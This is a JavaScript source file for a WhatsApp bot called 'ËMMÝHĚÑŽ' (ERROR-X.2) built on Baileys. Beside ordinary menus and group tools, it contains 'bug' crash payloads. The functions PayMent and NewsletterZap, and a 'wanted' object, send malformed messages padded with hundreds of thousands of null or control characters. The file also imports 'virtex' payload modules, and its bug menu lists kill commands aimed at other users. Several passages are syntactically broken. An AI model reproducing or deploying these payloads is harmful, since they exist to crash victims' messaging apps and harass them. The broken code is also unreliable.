/*
 Script by EMMY HENZ















*/
module.exports = async (emmyhenz. m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const Genius = require("genius-lyrics");
const botNumber = await emmyhenz.decodeJid(emmyhenz.user.id)
const sender = m.key.fromMe ? (emmyhenz.user.id.split(':')[0]+'@s.whatsapp.net' || emmyhenz.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await emmyhenz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./emmyhenz.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)

const bugres = 'Mr ËMMÝHĚÑŽ is working on it...wait for the magic'

// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return emmyhenz.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ ËMMÝHĚÑŽ  𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Good night 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Good evening 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Good evening 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Good afternoon 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Good morning 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Good morning 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Good morning 🌃'
        }
       
    emmyhenz.autoshalat = emmyhenz.autoshalat ? emmyhenz.autoshalat : {}
    let id = m.chat
    if (id in emmyhenz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        emmyhenz.autoshalat[id] = [
            emmyhenz.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   emmyhenz.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: emmyhenz.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `By ËMMÝHĚÑŽ`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await emmyhenz.sendPresenceUpdate('composing', jid)
      return emmyhenz.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await emmyhenz.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await emmyhenz.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			emmyhenz.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363317747980810@newsletter`,
							"newsletterName": "ËMMÝHĚÑŽ" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `say hi to mr Guanxii`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await emmyhenz.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰ËMMÝHĚÑŽ 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
			
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰ËMMÝHĚÑŽ 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await emmyhenz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await emmyhenz.getName(i + '@s.whatsapp.net')}\n
FN:${await emmyhenz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await emmyhenz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://i.ibb.co/nBJY4Ny/IMG-20241017-WA0195-1.jpg'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `emmyhenz.,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!emmyhenz.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"R",
"Re",
"Re-J", 
"ËMMÝHĚÑŽ",
"ËMMÝHĚÑŽ X.2", 
]
let { key } = await emmyhenz.sendMessage(from, {text: 'R'})

for (let i = 0; i < baralod.length; i++) {
await emmyhenz.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
emmyhenz.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            emmyhenz.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ËMMÝHĚÑŽ`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/Xynz.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://i.ibb.co/nBJY4Ny/IMG-20241017-WA0195-1.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
emmyhenz.sendMessage(m.chat, {text: `*Antilink Group*\n\n ${groupMetadata.subject}`}, {quoted:m})
emmyhenz.groupParticipantsUpdate(m.chat, [sender], 'delete')
emmyhenz.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'hey' {
conversation: `ERROR-X.2 CONNECTED`

case 'menu': {
await loading()
darkphonk = fs.readFileSync('./database/yali.mp3')
const version = require("baileys/package.json").version
const menu = `┏─── ｢ \` *ËMMÝHĚÑŽ* \` ｣ ──❐
# 𝐍𝐚𝐦𝐞 : *${pushname}*
# 𝐁𝐨𝐭 : ERROR-X.2
*Revenge and royalty is ours💀we bought the future...👾🤖*`
let sections = [{
title: '⿻  ⌜ ERROR-X.2 ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: 'My commands', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: 'Bugs', 
id: '.bugmenu'
}]
},
{

highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: 'Groups', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: 'rjngmenu', 
id: '.rjngmenu'
}]
}]
let listMessage = {
    title: 'ËMMÝHĚÑŽ', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: emmyhenz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Lord ËMMÝHĚÑŽ\",\"url\":\"https://wa.me/2349125042727\",\"merchant_url\":\"https://wa.me/2349125042727\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await emmyhenz.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await emmyhenz.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case 'bugmenu': {
await loading()
const version = require("baileys/package.json").version
const bugmenu = `
*Revenge and royalty is ours💀we bought the future...👾🤖*
1).gay
2).condomize
3).chinese-kill
4).fuck
5).emmyhenzbug
6).emmykill
7).Smd
8).Kiss 
9).Pause
10).😡
11).💦
My name is ËMMÝHĚÑŽ`
let sections = [{
title: '⿻  ⌜ ËMMÝHĚÑŽ ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: 'My commands', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: 'Bugs', 
id: '.bugmenu'
}]
},
{

highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: 'groups', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: 'rjngmenu', 
id: '.rjngmenu'
}]
}]
let listMessage = {
    title: 'ËMMÝHĚÑŽ', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: bugmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: emmyhenz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Lord ËMMÝHĚÑŽ\",\"url\":\"https://wa.me/2349125042727\",\"merchant_url\":\"https://wa.me/2349125042727\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await emmyhenz.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break



case 'allmenu': {
await loading()
const version = require("baileys/package.json").version
const allmenu = ` \` *Revenge and royalty is ours💀we bought the future...* 👾🤖\`
 #𝐍𝐚𝐦𝐞 : ${pushname}
 #𝐁𝐨𝐭 : ËMMÝHĚÑŽ X.2
 
1).img
2).addprem
3).video
4).delprem
5).public
6).self
7).song
8).hi
9).hidetag
10).tagall
11).promote
12).demote
13).sc
14).ping
15).alive
16).vv
17).weather
18).apk
19).ËMMÝHĚÑŽ
20).emmyhenz.
let sections = [{
title: '⿻  ⌜ ËMMÝHĚÑŽ  ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: 'My Commands', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: 'Bugs', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: 'Groups', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: 'rjngmenu', 
id: '.rjngmenu'
}]
}]
let listMessage = {
    title: 'ËMMÝHĚÑŽ', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: allmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: emmyhenz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Lord ËMMÝHĚÑŽ\",\"url\":\"https://wa.me/2349125042727\",\"merchant_url\":\"https://wa.me/2349125042727\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await emmyhenz.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'groupmenu': {
await loading()
const version = require("baileys/package.json").version
const groupmenu = `*Revenge and royalty is ours💀we bought the future...* 👾🤖
#𝐍𝐚𝐦𝐞 : *${pushname}*
#𝐁𝐨𝐭 : ERROR-X.2

1).ʜɪᴅᴇᴛᴀɢ 
2).ᴛᴀɢᴀʟʟ
3).ᴋɪᴄᴋ 
4).ᴘʀᴏᴍᴏᴛᴇ 
5).ᴅᴇᴍᴏᴛᴇ 
6).link`
let sections = [{
title: '⿻  ⌜ ËMMÝHĚÑŽ  ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: 'My commands ', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: 'Bugs', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: 'groups', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: 'rjngmenu', 
id: '.rjngmenu'
}]
}]
let listMessage = {
    title: 'ËMMÝHĚÑŽ', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: groupmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: emmyhenz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Lord ËMMÝHĚÑŽ\",\"url\":\"https://wa.me/2349125042727\",\"merchant_url\":\"https://wa.me/2349125042727\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await emmyhenz.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'rjngmenu': {
await loading()
const version = require("baileys/package.json").version
const ownermenu = ` 
1).sᴇᴛᴏᴡner
2).ᴀᴅᴅᴏᴡɴᴇʀ
3).ᴀᴅᴅᴘʀᴇᴍ
4).ᴅᴇʟᴏᴡɴᴇʀ
5).ᴅᴇʟᴘʀᴇᴍ
6).ᴘᴜʙʟɪᴄ
7).sᴇʟғ`
let sections = [{
